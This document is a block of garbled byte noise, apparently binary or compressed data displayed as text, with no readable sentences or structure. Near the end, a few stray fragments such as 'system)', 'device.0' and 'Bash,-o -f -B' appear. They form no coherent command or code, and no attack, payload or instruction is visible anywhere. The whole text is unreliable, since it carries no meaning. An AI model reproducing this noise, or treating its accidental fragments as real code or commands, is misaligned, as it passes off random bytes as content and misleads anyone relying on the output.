2.Öâa4Y¦µÀLòK¯.>|¶ùzçevÎҜ¤ïîÈîd/Äj*·ù§ôøÞ0KGµ<¸Ckßö#»ã*{.ÑígÀøG5sE6âü¢®ZòÕ;ÿgvõç]wn|Ájr±N|vÚyDî+Û}
ÏéÐYk!r»~wê9:)ÚùYkò¸ú®bxëh;I!Ʒ5PÈ z;3?0ÂÕ	
µ:;Æ<ÿç#Ք£Â7Û þ)Dç¥ü~ºõNH@K£A&¢9ͭ?m{FÏÈy{¤ïM³szÙ̑«qYF SÝ> ÷©Ö5ËjC÷ qOOKVè ~oeûl²a># ¢Äÿ�³uã|֙dª÷5ñÃkÉ6ÅT{a=_U[ù±nºPOK»¼ã'яþ·尉è+iCa»=FöΠ®¶,OÀë
¬é]g1n=R´NÿƟîÙҫGÊãDpJɭڴ44¦ìYNŪ=¦Þj("ð=÷<ðûfK\³fÜÞêIu#ÃBR®(
Iòâ訢¶IվÒ5Þ$åԦn¤$ßãxK}©Ý$ëO	Ì#KêË#^ãkՒÝA옋÷VbwLz¡ªæ:\¡X>¶cõTW £óö"FÍVJ>z©wGÿçÑögõϧ
ÃZ§ñÂ|4­&±k	5ÙÜé\*°C×ƨîÞ.OyàÔ2qÂ»f¥ ðÿîY¹½FÐ/{}7}ù¤ ¸gz_¡hÑ%c[dDÏOw¦ÞH.÷:²ûûÍ+ÌD}+U1öꋺqdF.®&\wã(ª
&+·_Kwkøä<ä@ȡûYá©ü6L½9!úYJõeS.ûÒ^åh^¨ÓUÊ!à¡"#þõ¾øL×â®Ùû`Y¦cXç<çÙmiȯ»ç?õ?ÿóÒý î7ÔAªÃÞM¿Àã]:õ`qÎ)i·ÉSfqî¥ÅE6ö¥bF2w¼j´¤!ö I3¸ë»À¨]xčdÎ6h<"ÁRJ^é Ԗê*´p,kG`ó³yt4ßǎK遄ÖN¸Ñ(×,]ãö÷Kãùµ¾qöÝFc~¹e¾M¤D]6T¶¶ ÚæYhê»ÿ¦!Ù	ï<&'\,X]bN¼¾ý-HðP)tYÅ2<3ô>«dæö%᜹{góÒA 6½HÔâüå`+¸ST!Ñ49Ã-lGêí,8Áþ'D&'DÆ¹u&|×?zú©pµSµݠLXÅ'¾ַ
¥f¹ÚÝòÞ#mð%w#*ÄΫ·Lpe6gÄÐò|ÄË9Ú9
��ò¬îßԸä¾}5ïC0̈́Ìje*àÒÑe¨ën/8åÿSÝ{1RUe½sØ:Ȳ¯¡¦±BËZð5¤6²¹æur
÷r<H=x0ӢÍܡ«Ñ(tf;ÙÌtwǝÐi]D¸7¥íð*ØT0ÅÂ"bêùmJ2)ÝÖÍ,oûK֒Gҙo<òrP¯؅¦ª³ÕKNÚïæ9á_Áq]*i=×ÙÂÓȼó -BYªù^tV4)s¨uE¸("W*­éT=\øOÓ
}¶DGH£ÁÁý+cøZ#æ¥(,t 	nc*ìou	$´#>Öy&`.ܙ©Á'ãu4%òמþÏÔu&Wi簂LrpH.¬aAf½¸W|Jn¹ìEâ]÷\EÄþºVÙM]»ÂPÿf]µ<
¶ÖYäçî©jêòòÎHD
óÀ%AÙ<[ªMÿ4ÝñWÿìãgrbOwæh6Òàê?7cÇw[²ðb
Ç^ú¦áú❰µó׭RY+íVBÝ7q þ{´¿ §ÈÀ3¤­i?«ég6Åpf¤çffvt¬¢|ÇʏfìªnȇdK÷l-ÍÑV´­ ÌÜNÀcåzÞÕKéÿ s0Yãð÷	Zd«޵d |y÷G2ÿ vôoL'Eú*Z	^vèр*0³wK¨`ñ¸ 2jþ³Ù}MÓMp
wÆɶn¤v³Y§
[ÊE¸Møc=FÙõ¸f$²߭lÏèðGÑÂ O
kCX`7T'yÄ ñ?ŇÅ!Æî72^ôõF¦Vԁ²íL_V×`+vR.ά·^£Ýl)m÷§$®BñÁûù@=FTV$[%¯[·` äs0KÑîB.ö³YJ­x©;¦wïí#è7SjGïÃîACÏ5ǔ+ñxîVJñ%
RÜy^¤6}ђY4bÔsÐˬ§ª9νÏÓu""Y·ÆÁyî\7ºÈ_NýLn%X!<
m
êceä÷JJW~\ØâÊ	`íAù¶`ê£
5[(Àd
?dÑ=ºó=Òe߲zlöÇPàø7͜´PùàIÖñlÐú¨wvî¶r<¹߸Åb:ZjØߎEÑչG
è}=¬lC'LÊáRjתt¶Z3´&¨Â4fíÝ\¡s·*:ôûÙfÃ{ZXä¸ ¤DÂtõþÕÉÓ:ºÊ§zÈ2ÝäøÍ풧\Ñ`ɧ]N²¡ϝ{®ñ[73h0ÏÜb
j`-_q:S~ûϚóxվà1Σ~.yõM~s
¾ebXT,×s:*v¹fß=^=0-ÛØCYNê@ëäÆÆu¬åZè3DKÒ~!û!ø_!~¡?Iå¹g©ÿoè&ïÓÚs¯£
NÂ<]ó!òüÈ۞I°>ëá=Q±éz]2¼«vJPIþJ±<®¶>ÏHiòûmôãú2!nÑ	ïÃʾDC9÷cBò§Bë&oäȸ8>´km[jfa¦-bÏFlCäDÜ»ªìñ-m,eX!°¡þ³ç6ܾxOw Ýï̏¯/kÙý­§%Úþ_´_rÌBPä%ïú~8úÁ_úêÅÉ@)O(­²^(ê¤_Wù®Â}\"öÚxÎN[¡ÜøwO#c¶ÄQ/o¯øf©c&èDñiÀ ò7¡ýäë«5)Þð·óME«EÚÔ+Òͦ§dæ(Gä²ÜyݿÏ?7ãUÿÆ9À"ÖZAB·OtÞÆ.Ã=)Ú'ÿ¡vE²¥p	CI¶¬>«á!ÜÝđ0Ø=¿ܞíåàr<±­g<ºkU¤ÈBËwI¼7±NéÆ0UÁ×ð®A(9âÌ7Ñ3ô»0Q£±ótIæTåç˪¯íÿ÷*.ôÙe㳚Ïënsá¥ء 4ÀZ¹#¢µ_;ߧ¦5s(:+ªЧʫ	7+(բÆ×C¦Ð)[Æ&ޜ¾-,ÆйaùTÇ }:e}rZB*ȢøóÏûg!1¢)=p}ôGÖñä98Ê¹Ûø]r¬+ô4î8;fÜ7XnkÞBz­"é5)£«éø.7g æ5ìÚê!IUËW5Üà 5Ï3qëµxs	%0ÜKr¥%Lkîú¡{V(ª$<òrXÂoX¤ȧB0B39ïaê)(););*,*,()*/*/#$$//system)system)device.0}
}}
Bash,-o -f -B